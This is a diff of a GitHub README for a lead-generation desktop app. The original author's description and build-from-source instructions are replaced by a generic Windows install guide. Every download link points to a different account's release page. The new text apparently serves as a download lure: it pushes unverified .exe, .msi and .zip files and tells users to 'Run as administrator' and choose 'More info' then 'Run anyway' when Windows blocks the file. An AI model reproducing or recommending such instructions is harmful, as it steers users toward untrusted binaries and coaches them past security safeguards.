@@ -1,118 +1,234 @@
-# Leads Intercontinental - Global Intelligence Engine
+# 🔎 leads-intercontinental - Find and track high-value leads
 
-<p align="center">
-  <img src="https://images.weserv.nl/?url=https://raw.githubusercontent.com/CodeNKoffee/leads-intercontinental/main/public/leads-intercontinental.png&w=400&fit=cover&mask=circle" alt="Leads Intercontinental Logo" width="200"/>
-</p>
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/lidand5937/leads-intercontinental/releases)
 
-<p align="center">
-  <a href="https://buymeacoffee.com/h4temsoliman">
-    <img src="https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Support%20My%20Work-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black" alt="Buy Me A Coffee" />
-  </a>
-</p>
+## 🚀 Getting Started
 
-Leads Intercontinental is a high-performance, sovereign lead generation and intelligence deployment system. It identifies High-Value Targets (HVTs) across diverse sectors using a multi-stage discovery and enrichment pipeline.
+Leads Intercontinental is a Windows desktop app for lead discovery and intelligence work. It helps you scan, sort, and review lead data in one place.
 
-## 🛡️ Strategic Capabilities
+Use the release page to get the app for Windows:
 
-- **Hybrid Discovery** - Combines OpenStreetMap spatial data with real-time Google Search scraping.
-- **Enigma Enrichment Engine** - Powered by Serper.dev to extract verified websites and contact emails.
-- **Friction Auditing** - Calculates "Revenue Leak" indices based on niche-specific friction multipliers.
-- **Tactical Dispatch** - Generates "Architecture of Ease" audit drafts for immediate review and dispatch.
-- **Sovereign Storage** - Uses Dexie.js (IndexedDB) for secure, private, and persistent local data.
+[Visit the release page to download](https://github.com/lidand5937/leads-intercontinental/releases)
 
-## 🖥️ Getting Started
+## 💻 What this app does
 
-### Native Desktop App (Recommended)
+Leads Intercontinental helps you:
 
-1. **Download**: Obtain the latest release from the `dist-electron/` directory.
-2. **Install**: Run the generated `.dmg` (Mac) or `.zip` file.
-3. **Configure**: Launch the app and enter your Serper.dev API key in the configuration sidebar.
+- Find lead data from multiple sources
+- Enrich results with extra details
+- Organize targets by sector or type
+- Review records in a clean desktop view
+- Keep your work in a local app on your machine
 
-### Building from Source
+It is built for end users who want a simple desktop tool instead of a web app or a set of scripts.
 
-#### Prerequisites
-- Node.js (v18+)
-- Bun (recommended) or NPM
+## 📦 System Requirements
 
-#### Installation
-```bash
-# Clone the repository
-git clone https://github.com/CodeNKoffee/leads-intercontinental.git
-cd leads-intercontinental
+Before you install, make sure your PC meets these basic needs:
 
-# Install dependencies
-bun install
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection for the first download and data updates
+- Standard user access on the computer
 
-#### Running the Engine
-```bash
-# Development (Browser)
-bun dev
+For best use, keep Windows updated and close other large apps before you run it.
 
-# Native Shell (Desktop)
-bun run electron:dev
+## 🧭 Download and Install on Windows
 
-# Production Build (Packaged App)
-bun run electron:build
-```
+Follow these steps on your Windows PC.
 
-<p align="center">
-  <b>Fuel the Engine</b><br/>
-  <a href="https://buymeacoffee.com/h4temsoliman">
-    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" width="180" />
-  </a>
-</p>
+1. Open the release page:
+   https://github.com/lidand5937/leads-intercontinental/releases
 
-## 🛠️ Tech Stack
+2. Find the latest release at the top of the page.
 
-- **Frontend** - React, Vite, TypeScript
-- **Styling** - Tailwind CSS, Framer Motion, Shadcn/UI
-- **Database** - Dexie.js (IndexedDB)
-- **Intelligence** - Axios, Serper.dev API, Nominatim (OSM)
-- **Desktop Shell** - Electron, Electron Builder
+3. Look for the Windows download file. It may end in:
+   - `.exe`
+   - `.msi`
+   - `.zip`
 
-## 📂 Project Structure
+4. If you download a `.zip` file, right-click it and choose Extract All.
 
-```
-leads-intercontinental/
-├── electron/              # Electron main & preload scripts
-├── src/
-│   ├── components/        # Modular UI (LocationEngine, LeadTable, etc.)
-│   ├── lib/               # Intelligence logic (scraper.ts, db.ts)
-│   ├── pages/             # Main application views
-│   └── hooks/             # Reactive state logic
-├── public/                # Static assets & icons
-└── assets/                # Production build artifacts
-```
+5. Open the extracted folder.
 
-## 🌟 Stargazers
+6. Double-click the app file to start it.
 
-A massive thank you to everyone fueling this mission!
+7. If Windows asks for permission, choose Yes or Run.
 
-<!-- STARGAZERS_START -->
-<table><tr>
-    <td align="center">
-      <a href="https://github.com/janaSalehs" title="janaSalehs">
-        <img src="https://images.weserv.nl/?url=https://avatars.githubusercontent.com/u/173851512?v=4&w=50&h=50&fit=cover&mask=circle" width="50" height="50" style="display: block;" alt="janaSalehs"/>
-      </a>
-    </td>
-    <td align="center">
-      <a href="https://github.com/CodeNKoffee" title="CodeNKoffee">
-        <img src="https://images.weserv.nl/?url=https://avatars.githubusercontent.com/u/96267016?v=4&w=50&h=50&fit=cover&mask=circle" width="50" height="50" style="display: block;" alt="CodeNKoffee"/>
-      </a>
-    </td></tr></table>
-<!-- STARGAZERS_END -->
+8. Wait for the app to open.
 
-## 📜 License
+9. If you made a shortcut, use it next time to launch the app faster.
 
-MIT License - see the [LICENSE](LICENSE) file for details.
+## 🪟 First Run Setup
 
----
+The first time you open the app, you may need to complete a short setup flow.
 
-<p align="center">
-  Developed by <b>Hatem Soliman</b><br/>
-  <a href="https://buymeacoffee.com/h4temsoliman">Support this mission on Buy Me a Coffee</a>
-</p>
+1. Choose your language or region if asked.
+2. Review the main dashboard.
+3. Set your working folder if the app asks for one.
+4. Allow the app to create local files if prompted.
+5. Test one small scan to confirm everything works.
 
----
-*Time is the only commodity that cannot be exported. We protect it.*
+If the app offers sample data, use it first so you can learn the layout before you load your own leads.
+
+## 🔍 Main Features
+
+### Lead Discovery
+Scan through records from selected sources and collect likely matches based on your search rules.
+
+### Data Enrichment
+Add useful details to leads so each record is easier to review and compare.
+
+### Sector Sorting
+Group leads by industry, company type, or other filters that help you stay organized.
+
+### Target Review
+Open a result set and inspect each record in a simple table view.
+
+### Local Desktop Use
+Run the app on your Windows computer without needing to work in a browser.
+
+## 🧩 How to Use It
+
+### 1. Start a new search
+Choose the kind of leads you want to find. Add a name, sector, location, or other search terms.
+
+### 2. Set your filters
+Pick the rules that matter to you. You can narrow results by region, company size, or field.
+
+### 3. Run the discovery pass
+Start the scan and let the app collect matches.
+
+### 4. Review the results
+Check the list of leads, open each record, and sort them by value or relevance.
+
+### 5. Enrich selected leads
+Run the enrichment step on the records you want to keep.
+
+### 6. Save your work
+Store the results in a local file so you can return to them later.
+
+## 🛠 Troubleshooting
+
+### The app does not open
+- Make sure you downloaded the Windows version
+- Check that the file finished downloading
+- Try right-clicking the app and choosing Run as administrator
+
+### Windows blocks the app
+- Open the file again
+- If Windows shows a security prompt, choose More info and then Run anyway
+- Confirm the file came from the release page
+
+### The app opens as a ZIP file
+- Extract the ZIP first
+- Open the extracted folder
+- Run the app from inside the folder
+
+### The app feels slow
+- Close other large programs
+- Restart your computer
+- Make sure you have enough free disk space
+
+### No results show up
+- Check your search terms
+- Try a broader filter
+- Make sure the source or data set is available
+
+## 📁 File and Folder Use
+
+The app may create local folders for:
+
+- Saved lead sets
+- Search history
+- Exported files
+- App settings
+- Temporary processing files
+
+Keep these files in a place you can find later. If you move the app folder, keep the saved data with it if the app stores data locally.
+
+## 🔒 Privacy and Local Use
+
+This app is meant to run on your own computer. That means you can keep your work in a local environment and control where your files go.
+
+If you store leads or exports, keep them in a folder with access control that fits your needs.
+
+## 🧪 Suggested Workflow
+
+A simple way to use the app:
+
+1. Start with one target sector
+2. Run a small search first
+3. Check the results for quality
+4. Enrich the best matches
+5. Export the final list
+6. Move on to the next sector
+
+This helps you stay organized and keeps each run easy to review.
+
+## 🖥️ Supported Platforms
+
+- Windows desktop
+- macOS desktop
+- Electron-based local app environment
+
+The Windows release page is the best place to begin if you want to install it on a PC.
+
+## 📥 Download
+
+Go to the release page and download the Windows build:
+
+[https://github.com/lidand5937/leads-intercontinental/releases](https://github.com/lidand5937/leads-intercontinental/releases)
+
+## 🧰 If You Want to Keep It Handy
+
+After you install the app, you can:
+
+- Pin it to the Start menu
+- Add a desktop shortcut
+- Place it on the taskbar
+- Keep your export folder in a known location
+
+## 📌 What to Expect After Install
+
+When the app runs, you should see a desktop interface with areas for:
+
+- Search setup
+- Results review
+- Filters
+- Data enrichment
+- Export or save actions
+
+Use the top menu or side panel to move between tasks if the app includes one
+
+## 🗂 Common File Types You May See
+
+You may work with files such as:
+
+- CSV
+- JSON
+- TXT
+- ZIP
+- EXE
+- MSI
+
+CSV is the most common format for lists of leads and exports
+
+## 🔄 Updating the App
+
+When a new release appears:
+
+1. Open the release page
+2. Download the newest Windows build
+3. Close the old version
+4. Install or replace it with the new one
+5. Open the updated app
+
+Keep your saved files before you update
+
+## 📞 Need the Download Again?
+
+Use the release page any time you need the Windows installer:
+
+[Download from GitHub Releases](https://github.com/lidand5937/leads-intercontinental/releases)
